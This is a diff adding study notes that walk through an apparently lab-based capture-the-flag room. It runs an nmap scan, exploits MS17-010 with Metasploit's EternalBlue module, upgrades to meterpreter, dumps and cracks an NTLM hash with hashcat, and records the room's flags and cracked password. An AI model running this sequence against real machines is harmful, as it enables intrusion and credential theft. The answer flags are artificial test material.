@@ -1,0 +1,153 @@
+>> Recon: 
+
+	1. How many ports are open with a port number under 1000? ( active enumeration )
+
+		>> nmap -Pn -A -sV 10.10.165.189
+		>>PORT      STATE SERVICE      VERSION
+		
+		135/tcp   open  msrpc        Microsoft Windows RPC 
+		139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+		445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+		49152/tcp open  msrpc        Microsoft Windows RPC
+		49153/tcp open  msrpc        Microsoft Windows RPC
+		49154/tcp open  msrpc        Microsoft Windows RPC
+		49158/tcp open  msrpc        Microsoft Windows RPC
+		49160/tcp open  msrpc        Microsoft Windows RPC
+		
+		there are 3 services running ( msrpc, netbios-ssn, microsoft-ds )	
+		
+		>>therefore answer is 3
+
+	2. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
+
+		>> ms17-010
+		
+>> Gain Access:
+	
+	1. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........):
+		
+		>> msf6 > search ms17-010
+		
+		>> 0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+		   1     \_ target: Automatic Target                  .                .        .      .
+		   2     \_ target: Windows 7                         .                .        .      .
+		   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+		   4     \_ target: Windows Server 2008 R2            .                .        .      .
+		   5     \_ target: Windows 8                         .                .        .      .
+		   6     \_ target: Windows 8.1                       .                .        .      .
+		   7     \_ target: Windows Server 2012               .                .        .      .
+		   8     \_ target: Windows 10 Pro                    .                .        .      .
+		   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+		   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes   
+		
+		>> use 0
+
+		>> set LHOST tun0
+		
+		>> set RHOSTS machine's iop
+		
+		>> exploit 
+		
+	2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
+	
+		>> exploit/windows/smb/ms17_010_eternalblue 
+		
+	3. Show options and set the one required value. What is the name of this value? (All caps for submission)
+
+		>> RHOSTS
+		
+>> Escalate:
+	
+	1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
+		
+		>> background
+		
+		>> search shell_to  >> post/multi/manage/shell_to_meterpreter ( use upgrade to the meterpreter shell )
+		
+	2. Select this (use MODULE_PATH). Show options, what option are we required to change?
+		
+		>> use post/multi/manage/shell_to_meterpreter
+		
+		>> show options 
+		
+		>> see the required option >> i.e. "SESSION"
+		
+	3. Set the required option, you may need to list all of the sessions to find your target here. 
+	
+		>> set SESSION 1
+		
+		>> exploit 
+		
+		>> shell
+		
+		>> whoami
+		
+	4. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.
+	
+		>> crtl + z 
+		
+		>> ps 
+		
+		>> migrate to other process using " migrate PID "
+		
+		>> shell 
+		
+>> Cracking
+	
+	1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
+		
+		>> ctrl + z
+		 
+		>> hashdump
+		
+		>> " Jon "
+	
+	2. Copy this password hash to a file and research how to crack it. What is the cracked password? 
+	
+		>> 1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+		
+		>> that’s a classic Windows NTLM hash format 
+
+		>> echo ffb43f0de35be4d9917ac0cc8ad57f8d > hash.txt
+
+		>> hashcat -m 1000 -a 0 hash.txt /path/to/wordlist.txt
+		
+		>> " alqfna22 "
+		
+>> Find flags!
+
+	1. Flag1? This flag can be found at the system root. 
+		
+		>> shell
+		
+		>> cd C://
+		
+		>> dir 
+		
+		>> type flag1.txt { type is like echo in the windows }
+		
+		>> " flag{access_the_machine} "
+		
+	2. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
+	
+		>> cd Users/Jon/Documents 
+		
+		>> type flag3.txt
+		
+		>> " flag{admin_documents_can_be_valuable} "
+		
+	3. Flag2? This flag can be found at the location where passwords are stored within Windows.
+	
+		>> from the flag3 we get to know that flag2 is in the system32
+		
+		>> cd C:\Windows\System32\config
+		
+		>> dir
+		
+		>> type flag2.txt
+		
+		>> " flag{sam_database_elevated_access} " 
+
+ 
+		
+		
